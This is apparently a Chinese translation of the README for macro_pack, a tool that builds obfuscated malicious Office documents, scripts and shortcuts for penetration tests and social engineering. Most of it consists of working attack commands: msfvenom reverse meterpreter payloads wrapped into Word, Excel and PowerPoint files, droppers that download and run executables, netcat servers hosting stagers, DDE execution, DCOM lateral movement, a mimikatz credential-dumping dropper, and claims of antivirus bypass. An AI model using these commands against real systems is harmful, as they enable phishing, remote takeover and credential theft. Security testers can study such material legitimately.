## 简述

 **macro_pack是一个用于自动生成混淆过的MS
Office文档、VB脚本等其他格式的工具，其主要目的是用于渗透测试、demo以及社会工程学的评估。macro_pack的目标是简化利用流程，反恶意软件绕过，并自动化vba生成到最终Office文档生成的过程。**

该工具的使用也非常简单：

>   * 不需要配置
>   * 一切都可以使用一行代码来完成
>   * 生成大部分Office格式和基于VBS的格式
>   * 高级VBA宏攻击以及DDE攻击
>

该工具与流行的pentest工具（Metasploit，Empire，...）生成的有效载荷兼容。与其他工具结合也很容易，因为它可以从stdin读取输入并输出到另一个工具。macro_pack由Python3编写，同时支持在Linux和Windows系统上运行。

 **注意：** Office文档自动生成或特洛伊木马功能仅支持已正确安装了MS Office应用程序的Windows平台上使用。

![macro_pack：一款用于自动化混淆和生成Office文档等文件格式的工具](https://image.3001.net/images/20180504/15254191928994.png!small)

##  **混淆**

该工具将会自动化的运用各种混淆技术。混淆功能与macro_pack生成的所有基于VBA和VBS的格式兼容。

基本混淆（-o选项）包括：

>   * 重命名函数
>   * 重命名变量
>   * 删除空格
>   * 删除评论
>   * 编码字符串
>

请注意，macro_pack混淆的主要目的不是反逆向，而是为了免杀。

## 生成

Macro Pack可以生成多种MS Office文档和脚本格式。格式将根据给定的文件扩展名自动猜测。使用选项--generate或-G生成文件。Macro
Pack专业版还允许木马存在Office文件，使用选项--trojan或-T即可。

Ms Office支持的格式包括：

>   * MS Word 97 (.doc)
>   * MS Word (.docm, .docx)
>   * MS Excel 97 (.xls)
>   * MS Excel (.xlsm, .xslx)
>   * MS PowerPoint (.pptm)
>   * MS Visio 97 (.vsd)
>   * MS Visio (.vsdm)
>   * MS Project (.mpp)
>

脚本（txt）支持的格式包括：

>   * VBA文本文件（.vba）
>   * VBS文本文件（.vbs）
>   * Windows脚本文件（.wsf）
>   * Windows脚本组件脚本（.wsc，.sct）
>   * HTML应用程序（.hta）
>   * XSLT样式表（.xsl）（MS XSLT包含脚本）
>

支持的快捷键格式包括：

>   * Shell链接（.lnk）
>   * 资源管理器命令文件（.scf）
>   * 网址快捷方式（.url）
>   * Groove快捷键（.glk）
>

请注意，所有脚本和快捷方式格式（LNK除外）也可以在Linux版本的macro_pack上生成。

## 关于专业模式...

macro_pack的部分功能我并未公开出来，因为他太过“武器化”。开发这款工具的目的是为了方便大家的研究学习和测试，但我知道我无法阻止恶意者的脚步，因此我选择暂不公开他们。专业模式包括以下功能：

>   * 高级反恶意软件绕过
>   * VBOM安全绕过
>   * 自解码VBA
>   * MS Office权限维持
>   * MS Office文档木马
>   * 使用DCOM对象进行内网漫游
>   * 使用<http://seclists.org/fulldisclosure/2017/Mar/90>反调试
>

## 运行/安装

 **运行Windows二进制**

>   1. 从<https://github.com/sevagas/macro_pack/releases/>获取最新的二进制文件
>   2. 在安装了正版Microsoft Office的PC上下载二进制文件。
>   3. 打开控制台，CD到二进制目录并调用二进制文件，就这么简单！
>

    
    
    macro_pack.exe --help

 **从源码安装**

下载并安装依赖关系：

    
    
    git clone https://github.com/sevagas/macro_pack.git
    cd macro_pack
    pip3 install -r requirements.txt

 **注意：**
对于Windows，您还需要从<https://sourceforge.net/projects/pywin32/files/pywin32/>手动下载pywin32

安装python 3 ：

    
    
    python3 macro_pack.py  --help
    # or
    python macro_pack.py --help # if python3 is default install

如果你想使用pyinstaller生成一个独立的exe文件：

>   * 在<http://www.voidspace.org.uk/python/pycrypto-2.6.1/>上下载并安装PyCrypto
>   * 双击Windows机器上的“build.bat”脚本。
>

生成的macro_pack.exe将位于bin目录中。

## 一些示例

### macro_pack community

混淆由msfvenom生成的vba文件并将结果放入新的vba文件中。

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba

混淆Empire stager vba文件并生成MS Word文档：

    
    
    macro_pack.exe -f empire.vba -o -G myDoc.docm

生成一个包含混淆dropper的MS Excel文件（下载payload.exe并存储为dropped.exe）

    
    
    echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop.xlsm" 

在共享文件夹中创建一个包含混淆的VBA reverse meterpreter payload的word 97文档：

    
    
    msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G \\REMOTE-PC\Share\meter.doc   

使用DROPPER_PS模板下载并执行Empire Launcher stager，而不使用powershell.exe

    
    
    # 1 Generate a fiez containing Empire lauchcher 
    # 2 Make that file available on web server, ex with netcat:
    { echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat empire_stager.cmd; } | nc -l -p 6666 -q1
    # 3 Use macro\_pack  to generate DROPPER_PS payload in Excel file
    echo http://10.5.5.12:6543/empire_stager.cmd | macro_pack.exe -o -t DROPPER_PS -G join_the_empire.xls
    # 4 When executed on target, the macro will download PowerShdll, run it with rundll32, and download and execute stager.

通过动态数据交换（DDE）攻击执行calc.exe

    
    
    echo calc.exe | macro_pack.exe --dde -G calc.xslx

![macro_pack：一款用于自动化混淆和生成Office文档等文件格式的工具](https://image.3001.net/images/20180504/1525419239182.png!small)

使用动态数据交换（DDE）攻击，通过PowerShell下载并执行文件

    
    
    # 1 Change the target file URL in resources\community\ps_dl_exec.cmd
    # 2 Embed download execute cmd in document
    python macro_pack.py --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.doc

生成混淆的Meterpreter reverse TCP VBS文件并运行它

    
    
    # 1 Generate obfuscated VBS based on meterpreter template
    echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.vbs
    # 2 On attacker machine Setup meterpreter listener
    Open msfconsole:
    use exploit/multi/handler
    set LHOST 0.0.0.0
    set PAYLOAD windows/meterpreter/reverse_tcp
    set AutoRunScript post/windows/manage/migrate
    set EXITFUNC thread
    set ExitOnSession false
    set EnableUnicodeEncoding true
    set EnableStageEncoding true
    # 3 run VBS file with wscript (run 32bit wscript because meterpreter payload is 32bit)
    %windir%\SysWoW64\wscript meter.vbs

生成混淆的HTA文件，该文件执行“systeminfo”并将结果返回到另一个在192.168.0.5上监听的macro_pack

    
    
    # 1 Generate HTA file with CMD template
    echo http://192.168.0.5:1234/a "systeminfo" | macro_pack.exe -t CMD -o -G info.hta
    # 2 On 192.168.0.5 open macro_pack as http listener
    macro_pack.exe -l 1234
    # 3 run hta file with mshta
    mshta.exe full/path/to/info.hta

当你点击时，生成执行本地hta文件的url快捷方式

    
    
    echo "file://C:\Users\username\Desktop\hello.hta" | macro_pack.exe -G yop.url

生成lnk快捷方式，执行一个cmd并运行带有calc.exe图标的calc.exe

    
    
    echo '"c:\Windows\System32\cmd.exe /c calc.exe" "calc.exe"' | macro_pack.exe -G calc.lnk

生成混淆的Meterpreter reverse https TCP SCT文件并运行

    
    
    # 1 Generate obfuscated VBS scriptlet based on meterpreter reverse HTTPS template
    echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.sct
    # 2 On attacker machinge Setup meterpreter listener
    Open msfconsole:
    use exploit/multi/handler
    set PAYLOAD windows/x64/meterpreter/reverse_https
    
    set LHOST <attacker_ip> # NOTE this cannot be 0.0.0.0 for reverse https
    set LPORT <port>
    set AutoRunScript post/windows/manage/migrate
    set EXITFUNC thread
    set ExitOnSession false
    set EnableUnicodeEncoding true
    set EnableStageEncoding true
    exploit -j
    # 3 run scriptlet with regsvr32 
    regsvr32 /u /n /s /i:meter.sct scrobj.dll

### macro_pack pro

将dropper与“report.xlsm”文件结合。使用防AV和反调试功能。

    
    
    echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 --trojan --av-bypass --stealth  -G "E:\accounting\report.xls"   

生成一个包含VBA自编码x64 reverse meterpreter VBA有效载荷（将绕过大多数AV）的Word文件。

    
    
    msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --vbom-encode --keep-alive  -G  out.docm

PowerPoint文件与木马以及reverse meterpreter。宏被混淆并被破坏，以绕过大多数防病毒软件的查杀。

    
    
    msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --av-bypass --trojan -G  hotpics.pptm

使用DCOM在远程PC上执行宏

    
    
    REM Step 1: Ensure you have enough rights
    net use  \\192.168.0.8\c$ /user:domain\username password
    
    REM Step 2: Generate document, for example here, meterpreter reverse TCP Excel file
    echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G meter.xlsm
    REM Step 3: Copy the document  somewhere on remote share
    copy meter.xlsm "\\192.168.0.8\c$\users\username\meter.xlsm"
    REM Step 4: Execute!
    macro_pack.exe --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"
    
    REM Step 2 to 4 in one step:
    echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\users\username\meter.xlsm" --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"

## 所有可用的选项

 **常规选项：**

    
    
    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option 
           If no input file is provided, input must be passed via stdin (using a pipe).
           
       -q, --quiet \tDo not display anything on screen, just process request. 
       
       -p, --print \tDisplay result file on stdout (will display VBA for Office formats)
           Combine this option with -q option to pipe result into another program
           ex: cat input_file.vba | macro_pack.exe -o -G obfuscated.vba -q -p | another_app
       
       -o, --obfuscate \tSame as '--obfuscate-form --obfuscate-names --obfuscate-strings'
       --obfuscate-form\tModify readability by removing all spaces and comments in VBA
       --obfuscate-strings\tRandomly split strings and encode them
       --obfuscate-names \tChange functions, variables, and constants names
       
       -s, --start-function=START_FUNCTION   Entry point of macro file 
           Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
           
       -t, --template=TEMPLATE_NAME    Use VBA template already included in macro_pack.exe.
           Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, WEBMETER, EMBED_EXE, EMBED_DLL 
           Help for template usage: macro_pack.exe -t help
            
       -G, --generate=OUTPUT_FILE_PATH. Generates a file. Will guess the format based on extension.
           Supported Ms Office extensions are: doc, docm, docx, xls, xlsm, xslx, pptm, vsd, vsdm, mpp.
           Note: Ms Office file generation requires Windows OS with right MS Office application installed.
           Supported Visual Basic scripts extensions are: vba, vbs, wsf, wsc, sct, hta, xsl.
           Supported shortcuts extensions are: scf, url, glk
       
       -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
            Use with EMBED_EXE template to auto drop and exec the file or with EMBED_DLL to drop/load the embedded dll.
       
       --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
            DDE attack mode is not compatible with VBA Macro related options.
            Usage: echo calc.exe | %s --dde -G DDE.docx
            Note: This option requires Windows OS with genuine MS Office installed. 
       
       --run=FILE_PATH Open document using COM to run macro. Can be useful to bypass whitelisting situations.
              This will trigger AutoOpen/Workbook_Open automatically. 
              If no auto start function, use --start-function option to indicate which macro to run. 
              This option is only compatible with Ms Office formats.
    
       -h, --help   Displays help and exit

### 仅macro_pack Pro支持：

    
    
    -b, --background    Run the macro in background (in another instance of office application)
      --vbom-encode   Use VBA self encoding to bypass antimalware detection and enable VBOM access (will exploit VBOM self activation vuln).
                    --start-function option may be needed.
      --av-bypass  Use various tricks  efficient to bypass most av (combine with -o for best result)
      --keep-alive    Use with --vbom-encode option. Ensure new app instance will stay alive even when macro has finished
      --persist       Use with --vbom-encode option. Macro will automatically be persisted in application startup path
                      (works with Excel documents only). The macro will then be executed anytime an Excel document is opened (even non-macro documents).
      -T, --trojan=OUTPUT_FILE_PATH   Inject macro in an existing MS office file. 
                      Supported files are the same as for the -G option.
                      Files will also be converted to approriate format, ex: pres.pptx will become pres.pptm
                      If file does not exist, it will be created (like -G option)
      --stealth      Anti-debug and hiding features
      --dcom=REMOTE_FILE_PATH Open remote document using DCOM for pivot/remote exec if psexec not possible for example.
                     This will trigger AutoOpen/Workboo_Open automatically. 
                     If no auto start function, use --start-function option to indicate which macro to run.

## 模板使用

可以使用 -t, --template=TEMPLATE_NAME结合其他选项来调用模板。以下是所有可用的模板。

### HELLO

只打印一条hello消息并了解宏

为此模板提供名字或作者的电子邮件

    
    
    -> Example: echo "@Author" | macro_pack.exe -t HELLO -G hello.pptm

### CMD

执行命令行并将结果发送到远程http服务器

为此模板提供服务器url和要运行的命令

-> Example: echo "<http://192.168.0.5:7777>" "dir /Q C:" | macro_pack.exe -t CMD -o -G cmd.doc
    
    
    # Catch result with any webserver or netcat
    nc -l -p 7777

### DROPPER

下载并执行一个文件。

为此模板提供文件url和目标文件路径

    
    
    -> Example: echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -G dropper.xls

### DROPPER2

下载并执行一个文件。 文件属性也设置为系统，只读和隐藏。

为此模板提供文件url和目标文件路径

    
    
    -> Example: echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER2 -o -G dropper.xlsm

### DROPPER_PS

使用rundll32下载并执行Powershell脚本（绕过被阻止的powershell.exe）。

注意：该有效载荷将从Github下载PowerShdll。

为此模板指定要运行的PowerShell脚本的URL

    
    
    -> Example: echo "<powershell_script_url>" | macro_pack.exe -t DROPPER_PS -o -G powpow.doc

### DROPPER_DLL

使用另一个扩展下载DLL并使用Office VBA运行它  
-> Example: 使用Office加载meterpreter DLL：
    
    
    REM Generate meterpreter dll payload
    msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll
    REM Make it available on webserver, ex using netcat on port 6666
    { echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat meter.dll; } | nc -l -p 6666 -q1
    REM Create OFfice file which will download DLL and call it
    REM The DLL URL is http://192.168.0.5:6666/normal.html and it will be saved as .asd file
    echo "http://192.168.0.5:6666/normal.html" Run | macro_pack.exe -t DROPPER_DLL -o -G meterdll.xls

### METERPRETER

Meterpreter通过Cn33liz使用MacroMeter reverse TCP模板。

该模板是由Cn33liz构建的CSharp Meterpreter Stager，并使用James
Forshaw的DotNetToJScript嵌入到VBA中。

为此模板提供监听msfconsole的IP和端口

    
    
    -> Example: echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm

推荐的msfconsole选项（使用exploit/multi/handler）：

    
    
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST <ip>
    set LPORT <port>
    set AutoRunScript post/windows/manage/migrate
    set EXITFUNC thread
    set ExitOnSession false
    set EnableUnicodeEncoding true
    set EnableStageEncoding true
    exploit -j

### WEBMETER

Meterpreter使用Cn33liz的VbsMeter reverse TCP模板。

该模板是由Cn33liz构建的CSharp Meterpreter Stager，并使用James
Forshaw的DotNetToJScript嵌入到VBA中。

为此模板提供监听msfconsole的IP和端口

    
    
    -> Example: echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.vsd

推荐的msfconsole选项（使用exploit/multi/handler）：

    
    
    set PAYLOAD windows/meterpreter/reverse_https (32bit)
    set PAYLOAD windows/x64/meterpreter/reverse_https (64bit)
    set AutoRunScript post/windows/manage/migrate
    set LHOST <ip>
    set LPORT <port>
    set EXITFUNC thread
    set ExitOnSession false
    set EnableUnicodeEncoding true
    set EnableStageEncoding true
    exploit -j

### EMBED_EXE

结合--embed选项，它将删除并执行（隐藏）嵌入文件。或者，您可以向模板提供应该提取文件的路径

如果未提取路径，则将在当前路径中使用随机名称提取文件。

    
    
    -> Example1: macro_pack.exe -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.vbs
    
    -> Example2: echo "path\\to\newcalc.exe" | macro_pack.exe -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.doc

### EMBED_DLL

结合使用--embed选项，它将删除并调用给定DLL中的函数。为此模板提供函数的名称和参数在DLL中调用

    
    
     -> Example1 : echo "main" | macro_pack.exe -t EMBED_DLL --embed=cmd.dll -o -G cmd.doc 
    
    -> Example2 : echo "main log privilege::debug sekurlsa::logonpasswords exit" | macro_pack.exe -t EMBED_DLL --embed=mimikatz.dll -o -G mimidropper.hta

## 效果

进过我大量的测试，大多数的杀毒软件都可用简单的混淆选项进行绕过。

### Empire VBA stager示例：

下面是常规Empire VBA stager的NoDistribute扫描器的结果

![macro_pack：一款用于自动化混淆和生成Office文档等文件格式的工具](https://image.3001.net/images/20180504/15254192875683.png!small)

以下是使用macro_pack -o（--obfuscate）选项的结果

![macro_pack：一款用于自动化混淆和生成Office文档等文件格式的工具](https://image.3001.net/images/20180504/15254193117897.png!small)

## 相关资源

关于MS Office, VBS安全入侵的博客文章：

>   * <https://subt0x11.blogspot.fr/2018/04/wmicexe-whitelisting-bypass-> hacking.html>
>   * <http://blog.sevagas.com/?My-VBA-Bot>
>   * <http://blog.sevagas.com/?Hacking-around-HTA-files>
>   * <http://pwndizzle.blogspot.fr/2017/03/office-document-macros-ole-> actions-dde.html>
>   * <https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/>
>   * <https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-> application-and-dcom/>
>   * <https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-> offensive-macro-capability/>
>   * <https://blog.quarkslab.com/analysis-of-ms16-104-url-files-security-> feature-bypass-cve-2016-3353.html>
>

其他

>   * <https://github.com/p3nt4/PowerShdll>
>   * <https://gist.github.com/vivami/03780dd512fec22f3a2bae49f9023384>
>   * <https://enigma0x3.net/2016/03/15/phishing-with-empire/>
>   * <https://github.com/EmpireProject/Empire>
>   * <https://medium.com/@vivami/phishing-between-the-app-> whitelists-1b7dcdab4279>
>   * <https://www.metasploit.com/>
>   * <https://github.com/Cn33liz/MacroMeter>
>   * <https://github.com/khr0x40sh/MacroShop>
>   * <https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-> stylesheet-scripting-using-msxsl-script>
>

***参考来源：[github](https://github.com/sevagas/macro_pack)，FB小编 secist
编译，转载请注明来自FreeBuf.COM**  

